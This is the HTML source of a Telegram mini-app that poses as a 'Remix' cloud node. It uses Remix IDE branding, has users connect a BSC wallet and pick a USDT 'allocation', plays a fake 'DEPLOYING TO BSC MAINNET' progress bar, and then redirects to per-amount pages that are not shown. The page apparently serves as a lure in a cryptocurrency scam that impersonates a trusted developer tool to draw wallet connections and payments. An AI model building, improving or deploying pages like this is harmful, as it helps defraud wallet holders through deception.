<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Grok Enterprise Node - Remix</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    
    <script type="module">
        // استخدام إصدارات مستقرة ومحددة من Reown AppKit
        import { createAppKit } from 'https://esm.sh/@reown/appkit@1.1.0'
        import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers@1.1.0'
        import { mainnet, bsc } from 'https://esm.sh/@reown/appkit/networks'

        const projectId = 'cb431b6f6e2a73a72983084a5bd30989' 

        const metadata = {
            name: 'Remix Kernel',
            description: 'IDE Cloud Development',
            url: window.location.origin,
            icons: ['https://remix.ethereum.org/favicon.ico']
        }

        const modal = createAppKit({
            adapters: [new EthersAdapter()],
            networks: [bsc, mainnet], 
            metadata,
            projectId,
            features: { analytics: false, email: false, socials: false },
            themeMode: 'dark'
        })

        window.appKitModal = modal;

        // وظيفة التحديث الفوري للواجهة
        async function syncStatus() {
            const state = modal.getAccount();
            if (state && state.isConnected && state.address) {
                const btn = document.getElementById('walletBtn');
                const addr = state.address;
                const shortAddr = `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`;
                
                btn.innerHTML = `
                    <div class="flex items-center gap-3">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#6EEB36" stroke-width="2.5"><path d="M20 6L9 17L4 12"></path></svg>
                        <span class="text-[#6EEB36] font-mono">BSC: ${shortAddr}</span>
                    </div>`;
                
                btn.classList.add('border-[#6EEB36]');
                window.isWalletConnected = true;
                
                // محاولة إغلاق النافذة العالقة برمجياً
                if (modal.isOpen) modal.close();
                
                if (typeof validateAction === 'function') validateAction();
            }
        }

        // الاستماع للتغييرات بشكل مكثف
        modal.subscribeAccount(() => syncStatus());
        
        // فحص "قوي" كل 500 ملي ثانية لحل مشكلة تعليق الواجهة في الصورة
        setInterval(syncStatus, 500);

    </script>

    <style>
        body { font-family: 'Inter', sans-serif; background-color: #000; height: 100vh; overflow: hidden; color: #f0f0f0; display: flex; flex-direction: column; }
        .app-overlay { position: fixed; inset: 0; background: radial-gradient(circle at center, #0a1a05 0%, #000 100%); z-index: 1; }
        .no-scrollbar::-webkit-scrollbar { display: none; }
        .loading-overlay { display: none; position: fixed; inset: 0; z-index: 1000; background: #000; flex-direction: column; align-items: center; justify-content: center; }
        .content-container { position: relative; background-image: url('background.png'); background-size: cover; border-radius: 40px 40px 0 0; border-top: 2px solid rgba(110, 235, 54, 0.5); flex: 1; display: flex; flex-direction: column; margin-top: 60px; z-index: 10; }
        .content-inner { position: relative; height: 100%; display: flex; flex-direction: column; padding: 24px; padding-top: 70px; }
        .profile-wrapper { position: absolute; top: 0; left: 50%; transform: translate(-50%, -50%); z-index: 100; }
        .remix-input { background: rgba(18, 18, 18, 0.8); border: 1px solid rgba(255, 255, 255, 0.05); color: #fff; backdrop-filter: blur(12px); }
        .ui-btn { padding: 20px; display: flex; align-items: center; justify-content: center; color: #6EEB36; font-weight: 800; background: rgba(110, 235, 54, 0.05); border: 1px solid rgba(110, 235, 54, 0.2); border-radius: 20px; width: 100%; text-transform: uppercase; transition: 0.3s; }
        .ui-btn.ready { background: #6EEB36; color: #000; cursor: pointer; }
        #bottomSheetOverlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(8px); z-index: 500; }
        #bottomSheet { position: fixed; bottom: -100%; left: 0; right: 0; background: #1c1c1e; border-radius: 24px 24px 0 0; z-index: 501; transition: 0.4s; max-height: 80vh; overflow-y: auto; }
        #bottomSheet.active { bottom: 0; }
    </style>
</head>
<body>

    <div class="app-overlay"></div>

    <div id="loadingOverlay" class="loading-overlay">
        <div class="text-[#6EEB36] text-[11px] font-black mb-4">DEPLOYING TO BSC MAINNET...</div>
        <div class="w-48 h-[2px] bg-white/5"><div id="progressBar" class="h-full bg-[#6EEB36] w-0 transition-all"></div></div>
    </div>

    <div id="bottomSheetOverlay" onclick="closeSheet()"></div>
    <div id="bottomSheet" class="no-scrollbar">
        <div class="p-5 border-b border-white/5 text-center font-bold text-white">SELECT ALLOCATION</div>
        <div id="amountOptionsContainer"></div>
    </div>

    <div class="flex-1 flex flex-col relative z-10 w-full h-full">
        <div class="h-[100px] flex items-center justify-center pt-10 text-center">
            <div>
                <h2 id="userName" class="text-white text-lg font-black uppercase tracking-tighter">REMIX NODE</h2>
                <span class="text-[#6EEB36] text-[10px] opacity-50 font-mono">ID: KRNL-X86-64</span>
            </div>
        </div>

        <div class="content-container">
            <div class="profile-wrapper">
                <div class="w-28 h-28 rounded-[32px] p-[2px] bg-[#6EEB36] shadow-2xl">
                    <img id="userPhoto" src="https://ui-avatars.com/api/?name=R&background=000&color=6EEB36" class="w-full h-full rounded-[30px]" alt="P">
                </div>
            </div>

            <div class="content-inner">
                <div class="flex-1 space-y-4">
                    <div class="bg-white/5 p-4 rounded-2xl border border-white/10 flex items-center gap-4">
                        <img src="https://remix.ethereum.org/favicon.ico" class="w-8 h-8">
                        <div><h3 class="text-xs font-bold text-white">REMIX CLOUD ENGINE</h3><p class="text-[9px] text-white/40">STATUS: READY</p></div>
                    </div>

                    <button id="walletBtn" onclick="window.appKitModal.open()" class="w-full remix-input rounded-2xl p-5 flex items-center justify-between text-sm font-bold">
                        <span>CONNECT BSC WALLET</span>
                        <span class="text-[#6EEB36]">›</span>
                    </button>

                    <button id="amountSheetTrigger" onclick="openSheet()" class="w-full remix-input rounded-2xl p-5 flex items-center justify-between text-sm font-bold">
                        <span id="selectedAmountText">SELECT VOLUME</span>
                        <span class="text-[#6EEB36]">›</span>
                    </button>
                </div>

                <div class="pb-8">
                    <button id="authorizeBtn" disabled class="ui-btn">DEPLOY KERNEL</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        let selectedAmount = null;
        const amounts = [100, 300, 500, 1000, 2000];

        const user = tg.initDataUnsafe?.user;
        if (user) {
            document.getElementById('userName').textContent = (user.first_name).toUpperCase();
            if (user.photo_url) document.getElementById('userPhoto').src = user.photo_url;
        }

        function openSheet() { 
            document.getElementById('bottomSheetOverlay').style.display = 'block';
            document.getElementById('bottomSheet').classList.add('active'); 
        }
        function closeSheet() { 
            document.getElementById('bottomSheetOverlay').style.display = 'none';
            document.getElementById('bottomSheet').classList.remove('active'); 
        }

        const container = document.getElementById('amountOptionsContainer');
        amounts.forEach(amt => {
            const div = document.createElement('div');
            div.className = 'p-5 flex justify-between border-b border-white/5 active:bg-white/5';
            div.innerHTML = `<span class="font-bold text-white">${amt} USDT</span><span class="text-[#6EEB36] font-mono">$${(amt * 0.15).toFixed(2)}</span>`;
            div.onclick = () => {
                selectedAmount = amt;
                document.getElementById('selectedAmountText').textContent = `${amt} USDT ALLOCATION`;
                closeSheet();
                validateAction();
            };
            container.appendChild(div);
        });

        function validateAction() {
            const btn = document.getElementById('authorizeBtn');
            if (window.isWalletConnected && selectedAmount) {
                btn.disabled = false;
                btn.classList.add('ready');
            }
        }

        document.getElementById('authorizeBtn').onclick = function() {
            document.getElementById('loadingOverlay').style.display = 'flex';
            let p = 0;
            const inv = setInterval(() => {
                p += 5; document.getElementById('progressBar').style.width = p + '%';
                if (p >= 100) { clearInterval(inv); window.location.href = selectedAmount + '.html'; }
            }, 50);
        };
    </script>
</body>
</html>
